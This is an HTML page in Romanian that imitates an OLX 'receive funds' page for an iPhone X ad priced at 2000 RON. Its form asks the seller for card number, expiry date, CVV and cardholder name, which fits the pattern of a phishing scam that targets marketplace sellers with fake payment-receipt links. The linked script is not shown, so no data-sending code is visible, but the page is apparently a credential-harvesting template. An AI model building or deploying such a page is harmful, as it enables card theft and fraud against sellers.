<!DOCTYPE html>
<html>
<head>
  <title>Fonduri OLX</title>
  <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
  <div class="container">
    <h1>Pagină de obținere fonduri OLX</h1>
    <div class="payment-details">
      <h2>Detalii card</h2>
      <form>
        <label for="cardNumber">Număr card:</label>
        <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required>
        <br>
        <label for="expiration">Data expirării:</label>
        <input type="text" id="expiration" name="expiration" placeholder="MM/AA" required>
        <br>
        <label for="cvv">CVV:</label>
        <input type="text" id="cvv" name="cvv" placeholder="123" required>
        <br>
        <label for="name">Nume Titular Card:</label>
        <input type="text" id="name" name="name" placeholder="John Michael" required>
        <br>
        <input type="submit" value="Obține fonduri">
      </form>
    </div>
    <div class="ad-details">
      <h2>Detalii anunț</h2>
      <p>Titlu anunț: iPhone X</p>
      <p>Preț: 2000 RON</p>
      <p>Subtotal: 2000 RON</p>
      <p>Dobândă: 0 RON</p>
      <p>Vei Obține: 2000 RON</p>
    </div>
  </div>
  <script src="script.js"></script>
</body>
</html>
